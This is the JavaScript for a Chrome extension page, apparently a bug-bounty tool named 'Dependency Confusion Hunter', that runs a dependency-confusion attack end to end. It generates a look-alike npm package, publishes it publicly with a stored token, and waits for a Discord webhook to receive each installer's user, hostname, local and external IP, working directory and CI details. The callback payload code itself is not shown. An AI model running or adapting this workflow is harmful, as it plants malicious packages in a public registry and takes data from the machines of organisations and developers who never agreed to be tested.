// PoC Workflow - Dependency Confusion Hunter
// Author: OFJAAAH

let packageName = '';
let packageType = 'npm';
let callbackUrl = '';
let pocPackage = null;
let receivedCallback = null;
let generatedReport = '';
let startTime = null;
let timerInterval = null;
let pollInterval = null;

// Initialize on load
document.addEventListener('DOMContentLoaded', () => {
  // Get package name from URL params
  const params = new URLSearchParams(window.location.search);
  packageName = params.get('package') || '';
  packageType = params.get('type') || 'npm';

  if (!packageName) {
    logConsole('error', 'No package specified in URL');
    document.getElementById('packageNameDisplay').textContent = 'Error: No package specified';
    return;
  }

  // Initialize UI
  document.getElementById('packageNameDisplay').textContent = packageName;
  document.getElementById('packageType').textContent = packageType.toUpperCase();

  // Setup event listeners (CSP blocks inline onclick handlers)
  setupEventListeners();

  // Start workflow
  startWorkflow();
});

// Setup all event listeners (required for CSP compliance in Chrome extensions)
function setupEventListeners() {
  // Clear console button
  const clearBtn = document.getElementById('btnClearConsole');
  if (clearBtn) clearBtn.addEventListener('click', clearConsole);

  // Manual callback form button
  const showFormBtn = document.getElementById('btnShowCallbackForm');
  if (showFormBtn) showFormBtn.addEventListener('click', showManualCallbackForm);

  // Submit callback button
  const submitBtn = document.getElementById('btnSubmitCallback');
  if (submitBtn) submitBtn.addEventListener('click', submitManualCallback);

  // Cancel callback button
  const cancelBtn = document.getElementById('btnCancelCallback');
  if (cancelBtn) cancelBtn.addEventListener('click', hideManualCallbackForm);

  // Download all files button
  const downloadBtn = document.getElementById('btnDownloadAll');
  if (downloadBtn) downloadBtn.addEventListener('click', downloadAllFiles);

  // Copy commands button
  const copyBtn = document.getElementById('btnCopyCommands');
  if (copyBtn) copyBtn.addEventListener('click', copyPublishCommands);

  // Mark as published button
  const markBtn = document.getElementById('btnMarkPublished');
  if (markBtn) markBtn.addEventListener('click', markAsPublished);

  // File toggles
  document.querySelectorAll('.file-header').forEach(header => {
    header.addEventListener('click', () => {
      const fileItem = header.closest('.file-item');
      if (fileItem) fileItem.classList.toggle('open');
    });
  });

  // Report buttons
  const copyReportBtn = document.getElementById('btnCopyReport');
  if (copyReportBtn) copyReportBtn.addEventListener('click', copyReport);

  const downloadReportBtn = document.getElementById('btnDownloadReport');
  if (downloadReportBtn) downloadReportBtn.addEventListener('click', downloadReport);
}

// Start the PoC workflow
async function startWorkflow() {
  startTime = Date.now();
  timerInterval = setInterval(updateTimer, 1000);

  logConsole('info', `Starting workflow for: ${packageName}`);
  updateMainStatus('running', 'In Progress');

  // Step 1: Initialize Interactsh
  await executeStep1();
}

// Step 1: Get Discord Webhook (no more Interactsh)
async function executeStep1() {
  setStepActive(1);
  logConsole('info', 'Checking Discord Webhook...');

  chrome.runtime.sendMessage({ action: 'getConfig' }, (response) => {
    if (response && response.config && response.config.discordWebhook) {
      callbackUrl = 'Discord Webhook';
      document.getElementById('callbackStatus').textContent = 'Discord';
      document.getElementById('callbackUrlDisplay').textContent = '✅ Discord Webhook configured';
      logConsole('success', 'Discord Webhook found!');
      logConsole('info', 'Callbacks will be sent to Discord');
      setStepCompleted(1);
      executeStep2();
    } else {
      logConsole('error', '❌ Discord Webhook not configured!');
      logConsole('warn', 'Configure the webhook in extension options');
      callbackUrl = 'Discord Webhook';
      document.getElementById('callbackUrlDisplay').textContent = '⚠️ Configure Discord Webhook in options';
      setStepCompleted(1);
      executeStep2();
    }
  });
}

// Step 2: Generate PoC Package
async function executeStep2() {
  setStepActive(2);
  logConsole('info', 'Generating PoC package...');

  chrome.runtime.sendMessage({
    action: 'generatePoCPackage',
    packageName: packageName,
    customCallbackUrl: callbackUrl
  }, (response) => {
    if (response && response.success) {
      pocPackage = response.package;

      // Update file contents
      document.getElementById('filePackageJsonContent').textContent =
        JSON.stringify(pocPackage.packageJson, null, 2);
      document.getElementById('fileCallbackJsContent').textContent =
        pocPackage.callbackScript;
      document.getElementById('fileIndexJsContent').textContent =
        pocPackage.indexJs;

      // Enable buttons
      document.getElementById('btnDownloadAll').disabled = false;
      document.getElementById('btnCopyCommands').disabled = false;
      document.getElementById('btnMarkPublished').disabled = false;

      logConsole('success', 'PoC package generated successfully!');
      logConsole('info', 'Files: package.json, callback.js, index.js');

      setStepCompleted(2);
      executeStep3();
    } else {
      logConsole('error', 'Failed to generate package: ' + (response?.error || 'Unknown'));
      setStepError(2);
    }
  });
}

// Step 3: Publish to npm automatically
async function executeStep3() {
  setStepActive(3);
  logConsole('info', '📦 Publishing package to npm automatically...');

  // Check if npm token is configured
  chrome.runtime.sendMessage({ action: 'getNpmToken' }, (tokenResponse) => {
    if (!tokenResponse || !tokenResponse.hasToken) {
      logConsole('error', '❌ npm token not configured!');
      logConsole('warn', '⚠️ MANUAL ACTION REQUIRED:');
      logConsole('info', '1. Configure npm token in extension options');
      logConsole('info', '2. OR download files and publish manually');
      logConsole('info', '3. Click "Marked as Published" when done');
      return;
    }

    // Token configured, try to publish automatically
    logConsole('info', 'npm token found, starting publication...');

    chrome.runtime.sendMessage({
      action: 'publishPoCPackage',
      packageName: packageName,
      callbackUrl: callbackUrl
    }, (response) => {
      if (response && response.success) {
        logConsole('success', '✅ Package published successfully!');
        logConsole('info', `📦 Name: ${response.packageName}`);
        logConsole('info', `📌 Version: ${response.version}`);
        logConsole('info', `🔗 URL: ${response.npmUrl}`);
        logConsole('info', `📡 Callback: ${response.callbackUrl}`);

        setStepCompleted(3);
        executeStep4();
      } else {
        logConsole('error', '❌ Publication failed: ' + (response?.error || 'Unknown'));

        // Check for specific errors
        if (response?.status === 403) {
          logConsole('warn', '⚠️ Token without permission. Check if you have publish access.');
        } else if (response?.status === 401) {
          logConsole('warn', '⚠️ Invalid or expired token.');
        } else if (response?.error?.includes('already exists')) {
          logConsole('warn', '⚠️ Package already exists on npm. Try another name.');
        }

        logConsole('warn', '📋 Manual publication available:');
        logConsole('info', '1. Download files by clicking "Download All"');
        logConsole('info', '2. Run npm commands to publish');
        logConsole('info', '3. Click "Marked as Published" when done');
      }
    });
  });
}

// Mark as published and start monitoring
function markAsPublished() {
  logConsole('success', 'Package marked as published!');
  setStepCompleted(3);
  executeStep4();
}

// Step 4: Wait for Discord callback confirmation
function executeStep4() {
  setStepActive(4);
  logConsole('info', '📡 Waiting for callback on Discord...');
  logConsole('warn', '⚠️ When notification arrives on Discord, click "Received Callback"');
  document.getElementById('callbackPanelStatus').className = 'status status-running';
  document.getElementById('callbackPanelStatus').textContent = 'Waiting for Discord';
}

// Show manual callback form
function showManualCallbackForm() {
  document.getElementById('callbackWaiting').style.display = 'none';
  document.getElementById('callbackForm').style.display = 'block';
  logConsole('info', '📝 Fill in the callback data received on Discord');
}

// Hide manual callback form
function hideManualCallbackForm() {
  document.getElementById('callbackWaiting').style.display = 'block';
  document.getElementById('callbackForm').style.display = 'none';
}

// Submit manual callback data
function submitManualCallback() {
  const callbackData = {
    extractedData: {
      package: packageName,
      user: document.getElementById('formUser').value || 'N/A',
      hostname: document.getElementById('formHostname').value || 'N/A',
      localIP: document.getElementById('formLocalIP').value || 'N/A',
      externalIP: document.getElementById('formExternalIP').value || 'N/A',
      cwd: document.getElementById('formCwd').value || 'N/A',
      platform: document.getElementById('formPlatform').value || 'N/A',
      ciEnvironment: document.getElementById('formCI').value || 'Local Machine'
    },
    timestamp: new Date().toISOString()
  };

  logConsole('success', '✅ Callback confirmado manualmente!');
  handleCallbackReceived(callbackData);
}

// Handle received callback
function handleCallbackReceived(callback) {
  receivedCallback = callback;
  const data = callback.extractedData || {};

  logConsole('success', '🎉 CALLBACK RECEBIDO!');
  logConsole('info', `User: ${data.user || 'N/A'}`);
  logConsole('info', `Hostname: ${data.hostname || 'N/A'}`);
  logConsole('info', `IP: ${data.localIP || 'N/A'}`);
  logConsole('info', `Directory: ${data.cwd || 'N/A'}`);

  // Update UI - hide both waiting and form, show received
  document.getElementById('callbackWaiting').style.display = 'none';
  document.getElementById('callbackForm').style.display = 'none';
  document.getElementById('callbackReceived').classList.add('show');
  document.getElementById('callbackPanelStatus').className = 'status status-success';
  document.getElementById('callbackPanelStatus').textContent = 'Recebido!';

  // Fill in callback data
  document.getElementById('cbPackage').textContent = data.package || packageName;
  document.getElementById('cbUser').textContent = data.user || 'N/A';
  document.getElementById('cbHostname').textContent = data.hostname || 'N/A';
  document.getElementById('cbLocalIP').textContent = data.localIP || 'N/A';
  document.getElementById('cbExternalIP').textContent = data.externalIP || 'N/A';
  document.getElementById('cbCwd').textContent = data.cwd || 'N/A';
  document.getElementById('cbPlatform').textContent = `${data.platform || 'N/A'} ${data.arch || ''}`;
  document.getElementById('cbCI').textContent = data.ciEnvironment || (data.isCI ? 'Yes' : 'No');
  document.getElementById('cbTimestamp').textContent = callback.timestamp || new Date().toISOString();
  document.getElementById('cbNodeVersion').textContent = data.nodeVersion || 'N/A';

  setStepCompleted(4);
  executeStep5();
}

// Step 5: Generate Report
function executeStep5() {
  setStepActive(5);
  logConsole('info', 'Generating report...');

  chrome.runtime.sendMessage({
    action: 'generateReport',
    callback: receivedCallback,
    packageName: packageName
  }, (response) => {
    if (response && response.success) {
      generatedReport = response.report;
      document.getElementById('reportContent').textContent = generatedReport;
      document.getElementById('reportPanel').classList.add('show');

      logConsole('success', 'Report generated successfully!');
      setStepCompleted(5);
      updateMainStatus('success', 'Completed!');

      // Stop timer
      clearInterval(timerInterval);
    } else {
      logConsole('error', 'Failed to generate report');
      setStepError(5);
    }
  });
}

// UI Helper functions
function setStepActive(stepNum) {
  document.getElementById(`step${stepNum}`).classList.add('active');
}

function setStepCompleted(stepNum) {
  const step = document.getElementById(`step${stepNum}`);
  step.classList.remove('active');
  step.classList.add('completed');
}

function setStepError(stepNum) {
  const step = document.getElementById(`step${stepNum}`);
  step.classList.remove('active');
  step.classList.add('error');
}

function updateMainStatus(type, text) {
  const status = document.getElementById('mainStatus');
  status.className = `status status-${type === 'running' ? 'running' : type === 'success' ? 'success' : 'error'}`;
  status.textContent = text;
}

function updateTimer() {
  const elapsed = Math.floor((Date.now() - startTime) / 1000);
  const mins = Math.floor(elapsed / 60).toString().padStart(2, '0');
  const secs = (elapsed % 60).toString().padStart(2, '0');
  document.getElementById('elapsedTime').textContent = `${mins}:${secs}`;
}

function logConsole(type, message) {
  const console = document.getElementById('console');
  const time = new Date().toLocaleTimeString();
  const line = document.createElement('div');
  line.className = `console-line ${type}`;
  line.innerHTML = `<span class="time">[${time}]</span>${escapeHtml(message)}`;
  console.appendChild(line);
  console.scrollTop = console.scrollHeight;
}

function clearConsole() {
  document.getElementById('console').innerHTML = '';
}

function toggleFile(fileId) {
  document.getElementById(fileId).classList.toggle('open');
}

function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

// Action functions
function downloadAllFiles() {
  if (!pocPackage) return;

  // Download each file
  downloadFile('package.json', JSON.stringify(pocPackage.packageJson, null, 2));
  setTimeout(() => downloadFile('callback.js', pocPackage.callbackScript), 200);
  setTimeout(() => downloadFile('index.js', pocPackage.indexJs), 400);
  setTimeout(() => downloadFile('README.md', pocPackage.readme), 600);

  logConsole('success', 'Arquivos baixados!');
}

function downloadFile(filename, content) {
  const blob = new Blob([content], { type: 'text/plain' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  a.click();
  URL.revokeObjectURL(url);
}

function copyPublishCommands() {
  const commands = `# Commands to publish PoC package
mkdir ${packageName}
cd ${packageName}

# Save the downloaded files in this folder

# Configure npm (if needed)
# echo "//registry.npmjs.org/:_authToken=SEU_TOKEN" > .npmrc

# Publique
npm publish --access public

# Wait for someone to install the package to receive the callback
`;

  navigator.clipboard.writeText(commands).then(() => {
    logConsole('success', 'Commands copied to clipboard!');
  });
}

function copyReport() {
  navigator.clipboard.writeText(generatedReport).then(() => {
    logConsole('success', 'Report copied to clipboard!');
  });
}

function downloadReport() {
  const filename = `dependency-confusion-report-${packageName}-${Date.now()}.md`;
  downloadFile(filename, generatedReport);
  logConsole('success', 'Report baixado!');
}
